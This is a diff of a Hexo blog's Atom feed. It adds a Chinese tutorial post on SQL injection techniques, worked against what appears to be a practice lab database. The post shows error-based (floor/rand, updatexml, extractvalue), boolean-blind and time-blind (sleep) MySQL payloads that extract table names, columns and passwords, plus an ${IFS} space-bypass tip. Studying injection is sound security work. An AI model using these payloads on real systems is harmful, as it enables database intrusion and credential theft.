@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-06-30T04:22:12.595Z</updated>
+  <updated>2017-07-01T13:59:17.451Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -16,11 +16,137 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>SQL注入技巧</title>
+    <link href="http://yoursite.com/%E6%BC%8F%E6%B4%9E/2017/07/01/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html"/>
+    <id>http://yoursite.com/漏洞/2017/07/01/SQL注入技巧.html</id>
+    <published>2017-07-01T13:27:25.000Z</published>
+    <updated>2017-07-01T13:59:17.451Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h3><p>1、连接符:mysql 空格，Oracle ||,sql server +<br>2、黑魔法${IFS}，Linux下可以使用其代替空格</p>
+<a id="more"></a>
+<h3 id="0x02-相关函数"><a href="#0x02-相关函数" class="headerlink" title="0x02 相关函数"></a>0x02 相关函数</h3><p>参考数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>mid()   从文本字段中提取字符</p>
+</blockquote>
+<p>SELECT MID(column_name,start[,length]) FROM table_name;<br>column_name    必需。要提取字符的字段。<br>start    必需。规定开始位置（起始值是 1）。<br>length    可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select mid(username,1,2) from users;</div><div class="line">+-------------------+</div><div class="line">| mid(username,1,2) |</div><div class="line">+-------------------+</div><div class="line">| Du                |</div><div class="line">| An                |</div><div class="line">| Du                |</div><div class="line">| se                |</div><div class="line">| st                |</div><div class="line">| su                |</div><div class="line">| ba                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| dh                |</div><div class="line">| ad                |</div><div class="line">+-------------------+</div><div class="line">mysql&gt; select mid(username,2) from users;</div><div class="line">+-----------------+</div><div class="line">| mid(username,2) |</div><div class="line">+-----------------+</div><div class="line">| umb             |</div><div class="line">| ngelina         |</div><div class="line">| ummy            |</div><div class="line">| ecure           |</div><div class="line">| tupid           |</div><div class="line">| uperman         |</div><div class="line">| atman           |</div><div class="line">| dmin            |</div><div class="line">| dmin1           |</div><div class="line">| dmin2           |</div><div class="line">| dmin3           |</div><div class="line">| hakkan          |</div><div class="line">| dmin4           |</div><div class="line">+-----------------+</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>limit() 返回前几条或者中间某几行数据</p>
+</blockquote>
+<p>select * from table limit m,n    其m指记录始index0始表示第条记录 n指第m+1条始取n条<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from users limit 1,2;</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>concat与concat_ws与group_concat</p>
+</blockquote>
+<p>  MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select concat(&apos;123&apos;,null);</div><div class="line">+--------------------+</div><div class="line">| concat(&apos;123&apos;,null) |</div><div class="line">+--------------------+</div><div class="line">| NULL               |</div><div class="line">+--------------------+</div><div class="line">mysql&gt; select concat(&apos;123&apos;,&apos;456&apos;);</div><div class="line">+---------------------+</div><div class="line">| concat(&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+---------------------+</div><div class="line">| 123456              |</div><div class="line">+---------------------+</div></pre></td></tr></table></figure></p>
+<p>和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select concat_ws(&apos;123&apos;,null);</div><div class="line">+-----------------------+</div><div class="line">| concat_ws(&apos;123&apos;,null) |</div><div class="line">+-----------------------+</div><div class="line">|                       |</div><div class="line">+-----------------------+</div><div class="line">mysql&gt; select concat_ws(&apos;123&apos;,&apos;456&apos;);</div><div class="line">+------------------------+</div><div class="line">| concat_ws(&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+------------------------+</div><div class="line">| 456                    |</div><div class="line">+------------------------+</div><div class="line">mysql&gt; select concat_ws(&apos;.&apos;,&apos;123&apos;,&apos;456&apos;);</div><div class="line">+----------------------------+</div><div class="line">| concat_ws(&apos;.&apos;,&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+----------------------------+</div><div class="line">| 123.456                    |</div><div class="line">+----------------------------+</div></pre></td></tr></table></figure></p>
+<p>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from aa;  </div><div class="line">+------+------+</div><div class="line">| id| name |</div><div class="line">+------+------+</div><div class="line">|1 | 10|</div><div class="line">|1 | 20|</div><div class="line">|1 | 20|</div><div class="line">|2 | 20|</div><div class="line">|3 | 200 |</div><div class="line">|3 | 500 |</div><div class="line">+------+------+</div><div class="line">mysql&gt;select id,group_concat(name) from aa group by id;  </div><div class="line">+------+--------------------+</div><div class="line">| id| group_concat(name) |</div><div class="line">+------+--------------------+</div><div class="line">|1 | 10,20,20|</div><div class="line">|2 | 20 |</div><div class="line">|3 | 200,500|</div><div class="line">+------+--------------------+</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>Count() 聚集函数，统计元祖的个数</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*) from users;</div><div class="line">+----------+</div><div class="line">| count(*) |</div><div class="line">+----------+</div><div class="line">|       13 |</div><div class="line">+----------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>rand() 用于产生一个0~1的随机数</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select rand(),rand();</div><div class="line">+---------------------+--------------------+</div><div class="line">| rand()              | rand()             |</div><div class="line">+---------------------+--------------------+</div><div class="line">| 0.37330908176797356 | 0.7865611089268337 |</div><div class="line">+---------------------+--------------------+</div><div class="line">mysql&gt; select * from users group by rand();</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">|  6 | superman | genious    |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>floor()   向下取整 </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select floor(123.456),floor(-123.456);</div><div class="line">+----------------+-----------------+</div><div class="line">| floor(123.456) | floor(-123.456) |</div><div class="line">+----------------+-----------------+</div><div class="line">|            123 |            -124 |</div><div class="line">+----------------+-----------------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>group by 依据我们想要的规则对结果进行分组</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from users group by username;</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>length()  返回字符串的长度</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select length(&apos;www.baidu.com&apos;);</div><div class="line">+-------------------------+</div><div class="line">| length(&apos;www.baidu.com&apos;) |</div><div class="line">+-------------------------+</div><div class="line">|                      13 |</div><div class="line">+-------------------------+</div><div class="line">mysql&gt; select * from users where length(username) &lt;6;</div><div class="line">+----+----------+----------+</div><div class="line">| id | username | password |</div><div class="line">+----+----------+----------+</div><div class="line">|  1 | Dumb     | Dumb     |</div><div class="line">|  3 | Dummy    | p@ssword |</div><div class="line">|  8 | admin    | admin    |</div><div class="line">+----+----------+----------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>Substr()  截取字符串  三个参数  （所要截取字符串，截取的位置，截取的长度）</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select substr(&apos;123456&apos;,2,3);</div><div class="line">+----------------------+</div><div class="line">| substr(&apos;123456&apos;,2,3) |</div><div class="line">+----------------------+</div><div class="line">| 234                  |</div><div class="line">+----------------------+</div><div class="line">mysql&gt; select substr(username,2,3) from users ;</div><div class="line">+----------------------+</div><div class="line">| substr(username,2,3) |</div><div class="line">+----------------------+</div><div class="line">| umb                  |</div><div class="line">| nge                  |</div><div class="line">| umm                  |</div><div class="line">| ecu                  |</div><div class="line">| tup                  |</div><div class="line">| upe                  |</div><div class="line">| atm                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| hak                  |</div><div class="line">| dmi                  |</div><div class="line">+----------------------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>Ascii()   返回字符串的ascii码</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select ascii(2);</div><div class="line">+----------+</div><div class="line">| ascii(2) |</div><div class="line">+----------+</div><div class="line">|       50 |</div><div class="line">+----------+</div><div class="line">mysql&gt; select ascii(substr(username,2,1)) from users;</div><div class="line">+-----------------------------+</div><div class="line">| ascii(substr(username,2,1)) |</div><div class="line">+-----------------------------+</div><div class="line">|                         117 |</div><div class="line">|                         110 |</div><div class="line">|                         117 |</div><div class="line">|                         101 |</div><div class="line">|                         116 |</div><div class="line">|                         117 |</div><div class="line">|                          97 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         104 |</div><div class="line">|                         100 |</div><div class="line">+-----------------------------+</div></pre></td></tr></table></figure>
+<h3 id="0x03-基于报错注入"><a href="#0x03-基于报错注入" class="headerlink" title="0x03 基于报错注入"></a>0x03 基于报错注入</h3><p>常用floor，UpdateXml(有长度限制,最长32位)，ExtractValue(有长度限制,最长32位)</p>
+<blockquote>
+<p>floor报错</p>
+</blockquote>
+<ul>
+<li><p>获取数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),(concat(0x3a,database(),0x3a,floor(rand()*2))) name from information_schema.tables group by name;</div><div class="line">+----------+-------------+</div><div class="line">| count(*) | name        |</div><div class="line">+----------+-------------+</div><div class="line">|       58 | :security:0 |</div><div class="line">|       47 | :security:1 |</div><div class="line">+----------+-------------+</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+-----------+</div><div class="line">| count(*) | name      |</div><div class="line">+----------+-----------+</div><div class="line">|       44 | ::users:0 |</div><div class="line">|       61 | ::users:1 |</div><div class="line">+----------+-----------+</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取字段名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+-------------+</div><div class="line">| count(*) | name        |</div><div class="line">+----------+-------------+</div><div class="line">|       51 | ::user_id:0 |</div><div class="line">|       54 | ::user_id:1 |</div><div class="line">+----------+-------------+</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+----------+</div><div class="line">| count(*) | name     |</div><div class="line">+----------+----------+</div><div class="line">|       46 | ::Dumb:0 |</div><div class="line">|       59 | ::Dumb:1 |</div><div class="line">+----------+----------+</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>UpdateXml报错</p>
+</blockquote>
+<ul>
+<li><p>获取表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 3,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~users&apos;</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos; limit 4,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~password&apos;</div><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos; limit 3,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~user&apos;</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 0,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~Dumb&apos;</div><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 1,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~I-kill-you&apos;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>extractvalue报错</p>
+</blockquote>
+<ul>
+<li><p>获取表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select table_name from information_schema.tables where table_schema=database() limit 3,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\users&apos;</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select password from users limit 1,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\I-kill-you&apos;</div><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select password from users limit 0,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\Dumb&apos;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="0x04-基于布尔盲注"><a href="#0x04-基于布尔盲注" class="headerlink" title="0x04 基于布尔盲注"></a>0x04 基于布尔盲注</h3><ul>
+<li><p>查看表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select table_name from information_schema.tables where table_schema=database() limit 0,1;</div><div class="line">+------------+</div><div class="line">| table_name |</div><div class="line">+------------+</div><div class="line">| emails     |</div><div class="line">+------------+</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取表名第一个字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">| e    |</div><div class="line">+------+</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取表名第一个字符的ASCII</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">|  101 |</div><div class="line">+------+</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>获取字段名与字段内容原理一样。</p>
+<h3 id="0x05-基于时间盲注"><a href="#0x05-基于时间盲注" class="headerlink" title="0x05 基于时间盲注"></a>0x05 基于时间盲注</h3><p>If(expr1,expr2,expr3)    判断语句<br>if(database()=’security’,1,2) 判断数据库名是否为security，正确返回1，错误返回2。基于时间的注入和基于布尔差不多，引入了if语句进行判断。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117,sleep(5),NULL) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">| NULL |</div><div class="line">+------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">mysql&gt; select if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),NULL) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">|    0 |</div><div class="line">+------+</div><div class="line">1 row in set (5.00 sec)</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-SQL注入&quot;&gt;&lt;a href=&quot;#0x01-SQL注入&quot; class=&quot;headerlink&quot; title=&quot;0x01 SQL注入&quot;&gt;&lt;/a&gt;0x01 SQL注入&lt;/h3&gt;&lt;p&gt;1、连接符:mysql 空格，Oracle ||,sql server +&lt;br&gt;2、黑魔法${IFS}，Linux下可以使用其代替空格&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+  <entry>
     <title>XXE漏洞攻防</title>
     <link href="http://yoursite.com/%E6%BC%8F%E6%B4%9E/2017/06/30/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2.html"/>
     <id>http://yoursite.com/漏洞/2017/06/30/XXE漏洞攻防.html</id>
     <published>2017-06-30T02:30:55.000Z</published>
-    <updated>2017-06-30T04:22:12.595Z</updated>
+    <updated>2017-07-01T13:31:29.046Z</updated>
     
     <content type="html"><![CDATA[<h3 id="0x01-XXE"><a href="#0x01-XXE" class="headerlink" title="0x01 XXE"></a>0x01 XXE</h3><p>　　XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击，漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p>
 <h3 id="0x02-XML"><a href="#0x02-XML" class="headerlink" title="0x02 XML"></a>0x02 XML</h3><p>　　XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!--XML申明--&gt;</div><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;   </div><div class="line">&lt;!--文档类型定义--&gt;</div><div class="line">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</div><div class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</div><div class="line">  &lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</div><div class="line">  &lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</div><div class="line">  &lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</div><div class="line">  &lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</div><div class="line">]&gt;</div><div class="line">&lt;!--文档元素--&gt;</div><div class="line">&lt;note&gt;</div><div class="line">&lt;to&gt;Dave&lt;/to&gt;</div><div class="line">&lt;from&gt;Tom&lt;/from&gt;</div><div class="line">&lt;head&gt;Reminder&lt;/head&gt;</div><div class="line">&lt;body&gt;You are a good man&lt;/body&gt;</div><div class="line">&lt;/note&gt;</div></pre></td></tr></table></figure></p>
@@ -98,7 +224,9 @@
       <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
     
     
-      <category term="漏洞，攻防" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%EF%BC%8C%E6%94%BB%E9%98%B2/"/>
+      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="XXE" scheme="http://yoursite.com/tags/XXE/"/>
     
   </entry>
   
@@ -1512,649 +1640,6 @@ print c
     </summary>
     
       <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>初识PentestBox</title>
-    <link href="http://yoursite.com/uncategorized/2016/12/13/%E5%88%9D%E8%AF%86PentestBox.html"/>
-    <id>http://yoursite.com/uncategorized/2016/12/13/初识PentestBox.html</id>
